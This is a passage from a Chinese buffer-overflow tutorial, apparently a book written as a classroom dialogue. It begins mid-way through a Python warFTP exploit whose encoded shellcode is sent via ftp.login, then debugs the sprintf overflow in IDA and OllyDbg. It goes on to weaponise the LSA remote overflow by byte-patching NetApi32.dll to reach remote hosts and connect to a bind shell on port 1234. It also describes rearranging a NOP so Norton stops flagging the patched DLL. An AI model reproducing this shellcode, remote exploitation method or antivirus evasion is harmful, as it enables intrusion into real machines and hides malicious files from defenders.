sc +="\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
sc +="\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
sc +="\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
sc +="\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
sc +="\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
sc +="\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
sc +="\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
sc +="\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
sc +="\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
sc +="\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
sc +="\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
sc +="\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
sc +="\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
sc +="\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
ftp.login( sc,'ww') 
```

成功利用！如图 7－30.

![](img/Q 版缓冲区溢出教程 229328.jpg)

好了，现在来分析分析漏洞了，不熟悉的地方开始了。

按老师讲的方法，在溢出时记下保存返回地址的 ESP 值，ESP＝00BBFD5C，然后设置写断点，看是哪个函数保存返回地址在那个 ESP 值中！

在 Ollydbg 中，用 ALT＋M 弹出断点设置框，也可设置内存写断点。但是，设置后有无数的指令对 00BBFD5C 处的值进行了写操作。中断倒是中断了很多次，但次数太多了，根本不知道是哪个函数的操作。郁闷！调了半天都没调出来，还有其他课也布置了作业。没办法，下节课问老师吧！

# 7.3 白盒法和 IDA 分析漏洞

## 7.3 白盒法和 IDA 分析漏洞

“大家用 Fuzzer 分析 warFTP 怎么样啊？”老师进入教室后问道。

“Fuzzer 太好用了！”古风说道。

“是啊，Python 也是，方便的定位出 USER 485 的地方是溢出点！”玉波说道。

“嗯，不错，那漏洞分析呢？”老师问道。

大家互相望了望，谁都没调出来。

“老师，那个方法不管用啊！”宇强鼓足勇气说道，“被中断的地方太多了，不能在发生溢出的前方中断下来。而且我们又要考试了，没有太多的时间进行调试啊！”

“是啊！”大家都很赞同宇强的说法。

“好的，这节课是本学期最后一次课了。在黑盒法分析失效的情况下，我们可以使用白盒法辅助分析漏洞。

# 7.3.1 白盒法测试

### 7.3.1 白盒法测试

“白盒测试也称结构测试或逻辑驱动测试，它知道产品内部工作过程，通过测试来检测产品内部动作是否按照规格说明书的规定正常进行。它检验程序中的每条通路是否都有按预定要求正确工作。”

小知识：白盒法测试

白盒法全面了解程序内部逻辑结构，对所有逻辑路径进行测试。“白盒”法是穷举路径测试。在使用这一方案时，测试者必须检查程序的内部结构，从检查程序的逻辑着手，得出测试数据。白盒测试的主要方法有逻辑驱动、基路测试等。

“白盒法也不能‘证明’一个程序是‘正确’的！”老师补充道，“贯穿程序的通路是天文数字，而且即使每条路径都测试了，仍然可能有错误。第一、穷举路径测试决不能查出程序违反了设计规范，即程序本身是个错误的程序。第二、穷举路径测试不可能查出程序中因遗漏路径而出错。第三、穷举路径测试可能发现不了一些与数据相关的错误。”

“老师，还是快说说漏洞分析吧！”台下焦急的说道。

# 7.3.2 IDA 帮助分析 warFTP 漏洞

### 7.3.2 IDA 帮助分析 warFTP 漏洞

“好，我们在 IDA 的帮助下来分析 warFTP 的漏洞吧！”

“IDA 是强大的反汇编工具（光盘有收录），不仅可以给出反汇编代码，还可以在我们的指引下主动进行一些分析；而且可以写些脚本 IDC 来进行自动分析。IDA 是白盒法测试时必用的工具！”

“打开 IDA 后，选择‘open’，打开 warFTP.exe 程序就开始分析反汇编了。”

“等一会儿分析完毕后，在‘Function’一栏可以直接看到调用的函数，包括 MFC 的函数名都可清楚的分析出来。”

大家看了看图 7－31，果然如此！

![](img/Q 版缓冲区溢出教程 230524.jpg)

“我们想一下，warFTP 是因为我们的过长字符串才引发的溢出；而且是远程溢出；所以……”老师慢慢的说，“一定是通过网络，warFTP 接收了我们的过长字符串才引起的溢出。”

“嗯！”大家点点头。

“一般的网络编程，百分之九九都是用 Socket 来完成的。warFTP 接收我们的字符串，应该就是通过……”

“哦！一定是使用 Socket，用 recv 或类似函数来完成的吧！”宇强抢着说道。

“对！我们看看 IDA 的‘function’那一栏，查看 Socket 相关的函数。发现了 MFC 的 CAsyncSocket ::Receive 函数，那是 MFC 封装的用于接收网络数据的函数，其位置在 0x004345B8。”

```
text:004345B8 ; public: virtual int __thiscall CAsyncSocket::Receive(void *,int,int) 
```

小知识：MFC

微软基础类库，是微软对 Windows API 的再次封装，期望简化编程的复杂度，提高软件开发效率并减少软件成本。

“经过白盒法的辅助分析后，我们得到了关键的启发。再运行 Ollydbg，加载程序，然后对 0x004345B8 地址设断点，如图 7－32。”

![](img/Q 版缓冲区溢出教程 231051.jpg)

“运行全 A 的超长字符串攻击程序，果然被 Ollydbg 成功中断下来。Receive 其实还是调用了 WSOCK32 的 recv 函数。我们跟进去就可以看见如下代码：”

```
73D4A22E > FF7424 0C PUSH DWORD PTR SS:[ESP+C]
73D4A232 FF7424 0C PUSH DWORD PTR SS:[ESP+C]
73D4A236 FF7424 0C PUSH DWORD PTR SS:[ESP+C]
73D4A23A FF71 04 PUSH DWORD PTR DS:[ECX+4]
73D4A23D E8 03000000 CALL MFC42.73D4A245 ; JMP to WSOCK32.recv
73D4A242 C2 0C00 RETN 0C 
```

“看，最后一个参数是[ECX+4]，值为 00D7E93C，是接收后数据存放的地方。我们在左下角的内存窗口中按 Ctrl＋G，弹出地址对话框，输入 00D7E93C 就会显示该地址的内容。recv 执行完后，可以看到，收到的就是我们发的东东：User AAAAA……如图 7-33。”

![](img/Q 版缓冲区溢出教程 231547.jpg)

“哦！”

“这就完成了我们漏洞分析最关键的一步，在字符串处理的前端中断了下来！我们继续跟踪，注意随时查看各个参数里的内容，发现我们发送的字符串就多多观察。”

“到了下面这里，是在判断开头的命令字符，这里是 USER 命令，如图 7－34。”

![](img/Q 版缓冲区溢出教程 231667.jpg)

“然后程序处理后面的字符串，经过耐心的跟踪，在 0042E2FA：call 004044c0 时，有对 00BBFD54 进行了写操作！即该函数把地址保存在 00BBFD54 这个位置。如图 7-35。”

![](img/Q 版缓冲区溢出教程 231768.jpg)

“哦！但 00BBFD54 和 00BBFD5C 不是同一个地址啊！”古风一脸疑问的表情。

“莫非是 ret n？”宇强说道。

“呵呵！我们按 F8 跟进去看看！”

“好，一下子就看见有一个 sprinft 函数！如图 7-36。”

![](img/Q 版缓冲区溢出教程 231877.jpg)

“我们边单步运行，边查看它的参数。”

“首先 PUSH EAX，这个 EAX 为如下：”

```
"[C 2004 11 26 22:42] 00001 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```

“就是日期时间加上我们输入的超长字符串。”

“然后，PUSH war-ftpd.004406C0，这里是%s，一个标准的字符串拷贝。”

“最后 PUSH ECX，再 CALL <&MSVCRT.sprintf>。”

“我们来计算一下，ecx＝0x00BBFB54；而保存返回地址在 ESP＝0x00BBFD54 中。”

“相减，0x00BBFD54－0x00BBFB54＝0x200＝512。”

“而前面[C 2004 11 26 22:42] 00001 AAA…有 28 个字符， 所以填充 A 为是 512-27＝485。果然是这样！”

“继续跟踪，到函数返回的时候，果然和宇强同学说的一样，是 RETN 4，如图 7-37。”

![](img/Q 版缓冲区溢出教程 232315.jpg)

“我们说过 RET 4＝POP EIP，ADD ESP，4。现在 ESP＝00BBFD54，对应的值为 41414141，所以返回后，系统会执行 0x41414141 的地方，如图 7-38。

![](img/Q 版缓冲区溢出教程 232409.jpg)

“最后看看为什么 RET 4 返回后，ESP 会成为 00BBFD5C。”

“RET 4＝POP EIP，ADD ESP，4。首先 POP EIP，那么 EIP 变成 0x41414141，而 ESP＋4＝00BBFD54＋4＝00BBFD58；再 ADD ESP，4＝ESP＋4＝00BBFD58＋4＝00BBFD5C。”

“所以返回后，EIP＝41414141，ESP＝00BBFD5C，果然验证了我们的分析，如图 7－39。”

![](img/Q 版缓冲区溢出教程 232618.jpg)

“小结一下，溢出是因为执行了 sprintf（eax,”％s”,”[] AAAAAAAAAA”） 。这里，eax 是一个局部变量，而 sprintf 没有验证字符串的长度，所以就发生溢出了！”

# 7.3.3 黑白结合，LSA 漏洞的分析利用

### 7.3.3 黑白结合，LSA 漏洞的分析利用

“一气呵成！不知不觉中就把漏洞找了出来，”宇强感叹道。

“呵呵！最后来一个高难度的吧！LSA 的远程溢出漏洞分析利用。这就需要黑白法结合了。”

“首先看看本地溢出，这个比较简单，图 7－40 里的代码就可引发本地溢出。”

![](img/Q 版缓冲区溢出教程 232850.jpg)

“其功能是从系统 Netapi32.dll 中找到 DsRolepEncryptPasswordStart 函数，然后执行该函数，函数的第一个参数过长，就会溢出，溢出效果么？呵呵，弹出一个出错对话框，倒计时 1 分钟后就重启。”

“哦！和震荡波的效果一样啊！”

“只能等它重启，没有办法了吗？”

“大家在运行程序里输入 shutdown –a ，可以终止系统关机。Shutdown 命令的帮助如图 7-41。”

![](img/Q 版缓冲区溢出教程 233051.jpg)

“因为可以直接用 DsRolepEncryptPasswordStart 函数引发本地异常，所以本地漏洞利用比较简单，大家用 Ollydbg 加载 lsass.exe 进程，然后填充 buf 用定位大法，就可轻松实现定位和利用！大家都应该很清楚了吧，这个作为寒假作业，大家自己跟入分析一下。”

大家纷纷埋头记下来。

“好了，我们来看看感兴趣的——远程利用！”

“我们刚才用的 Netapi32.dll 中的 DsRoleUpgradeDownlevelServer 函数是个客户端函数，我们给它的超长参数会在服务端函数 LSASRV.dll 中的 DsRolerUpgradeDownlevelServer?处理！注意，函数名只相差一个‘r’。大家下去亲自跟踪一下就清楚了。”

“服务端函数不会判断请求是哪儿来的，但微软实现时就固定好了客户端函数只向本机发请求。所以我们发请求，默认给本机，本机 LSASRV.dll 中的服务器函数处理就会出现问题重启。”

“好，现在我们的目标就是要给远程机器发送请求！但刚才说了，微软在实现代码时就固定了只能向本机发请求，那怎么办呢？”

“是啊！不好办啊！”台下说道。

“其实，平时我们使用修改后的东西也多了；要注册码，我们就破解注册码；要过期，我们就破解过期补丁。所以，我们也把比尔盖茨实现好的客户端代码改一下，不仅向本机发请求，也能向远程主机发请求。”

“真正的黑客精神，就是不断的深入研究技术，大胆创新，发扬共享精神。”

“我们用 IDA 反编译 NetApi32.dll。好，结束后，用名字找到 DsRoleUpgradeDownlevelServer()的地方。如图 7－42。”

![](img/Q 版缓冲区溢出教程 233751.jpg)

“好，从函数开始的地方，往下走一点点，代码如下：”

```
.text:7513D5F7 8D 45 CC lea eax, [ebp+var_34]
.text:7513D5FA 50 push eax
.text:7513D5FB 6A 00 push 0
.text:7513D5FD E8 0F 05 00 00 call _DsRolepEncryptPasswordStart@24 ; 
```

“在 IDA 中，默认是不显示机器码的，在‘Options→General→Disassembly’页面中，有 Number of opcode bytes，默认是 0，我们把它改成 6 或 8 就行了。如图 7－43。”

![](img/Q 版缓冲区溢出教程 234059.jpg)

“根据 eEye 的文档，那里就是我们要修改的地方！_DsRolepEncryptPasswordStart 函数的第一个参数就是主机。微软用的是 0，即为空，表示把请求发给本机。我们要把它改成远程主机的地址就 OK 了。”

“ShellCode 的是 DsRoleUpgradeDownlevelServer 的参数传来的；那么远程主机的地址也从那里传来吧！用 DsRoleUpgradeDownlevelServer 函数的第九个参数传主机地址；然后作为第一个参数给 DsRolepEncryptPasswordStart。”

“因为前面第九个参数已经给了[ebp+var＋34]了，我们把[ebp+var＋34]的内容压入就行了。”

“明白了思路，现在改写代码。注意，改写时要保证字节个数和原来的相同，参数也要压足。除了保证第一个参数压的是[ebp+var＋34]外，其他的乱压也可以，所以我们就这样吧：”

```
50 push eax
　　8B 45 CC mov eax, [ebp+var_34]
　　50 push eax
　　90 nop 
```

“这样就把存在[ebp+var_34]中的远程主机地址作为第一个参数压入；nop 是什么都不做的空指令，目的只是为了保证字节数和原来的相同。”

“好，我们调出 WinHex，搜索至我们要修改的地方，作图 7-44 的的修改。”

![](img/Q 版缓冲区溢出教程 234645.jpg)

“啊，诺顿报警了！这么厉害啊！”古风发现道。

“我们等会再来考虑这个问题，先把诺顿关掉，然后 LoadLibrary 我们改过后的 ww1NetApi.dll，并把第九个参数改成远程主机的地址，即 \ip\ipc$ 的 Unicode 形式。指定远程主机的 IP 地址，编译执行 LSA1.cpp，再 Telnet 远程主机的 1234 端口。‘啪’！果然连上了我们要攻击的远程主机。”

“成功了！”大家欢呼起来。

“我们再来改进改进。首先，辛辛苦苦修改的 dll 会被查杀成病毒，那么就要想办法让杀毒软件不认识！”

“杀毒软件是按照文件的特征码来识别一个病毒或木马的。我们只是在正常的系统文件 NetApi32.dll 的基础上改变了 6 个字节，其他完全相同；所以杀毒软件的特征码一定是判断的这 6 个字节！那我们就把这六个字节稍微改一下，看它还能否识别！”

“刚才说了，90 是 nop，表示什么都不做的空指令，我们把它放在其它指令之间，如图 7－45，和指令 50 （即汇编 PUSH EAX）交换一下位置。”

![](img/Q 版缓冲区溢出教程 235088.jpg)

“然后保存为 ww2NetApi.dll，让诺顿再扫描看看。呵呵！这次没报警了。其实，如果还要报警，我们可以继续修改 nop 位置，如还不行，还可改成 mov ebx [] ，再 push ebx 等。办法多得很呢！”

“不会被查杀了，看看效果啊！我们把程序改为读 ww2NetApi.dll，再运行，还是成功了！如图 7－46。

![](img/Q 版缓冲区溢出教程 235251.jpg)

小知识：特征码

现在绝大多数杀毒软件都是建立在“病毒特征码”基础上的。有新病毒出现时，厂商先要获得病毒的一个样本，提取出它的特征码，用户把特征码加入到病毒库中才能查杀。如果我们测试出了杀毒软件的判断特征码，将其改成不影响功能的其他指令，就肯定不会被查杀！从这个意义上来说，反病毒的技术需要一个革命化的突破！

“在此，我们是直接物理修改了 NetApi32.dll，就像破解一样，修改了物理文件。其实，我们还可在内存里动态修改，就如同内存注册机一样，动态读出内存的东西！这个交给大家下去完成吧！”

“现在我们可以说是完美的实现远程溢出了，但带有一个 300k 的 dll，试想震荡波拖着这个 dll 到处跑，也太难为它了吧！所以我们就把 dll 也去掉，完全用一个程序实现！”

“啊？怎么实现呢？”

“源代码是微软控制的，一般人都看不到。当然，对我们菜鸟来说，即使有了源代码，也是读不懂请求是如何实现的，更不用说自己写一个请求了。”

“所以黑盒法出场了！本机向远程发起请求时，一定会通过网络的。所以，我们可把远程主机发的请求包抓下来，模拟客户端，向服务端发送这样的网络包就可以了！

“好啊，说干就干！”古风打开 Ethereal（光盘有收录），再对远程主机攻击一次，然后把攻击发送的包抓下来，如图 7－47。

![](img/Q 版缓冲区溢出教程 235809.jpg)

“192.168.1.166 是攻击机，192.168.1.169 的被攻击的服务机。192.168.1.166 先是 TCP 三次握手，然后建立空连接，图 7－47 里 NT Create Andx Request, Path:\lsarpc 那排是关键！那就是发送一定的请求，然后把我们的超长参数发过去。”

“但我们不用具体了解它的含义，只管把请求拷贝下来存在数组中，直接向远程机器发送就是了。”

“这次运行我们的 LSA2.cpp，又成功了，它可是不带 dll 的哦!”

“哇！”

“Sniffer 是很有用的，如果有溢出的 exe 程序，那我们就不用具体搞清楚协议、实现什么的，到时直接一抓包，发挥菜鸟吃苦精神，一句句的敲在发送数据中就可以了！而且这种方法分析微软未文档化的东西（特别是 RPC 相关的东西），那更是相当有用！”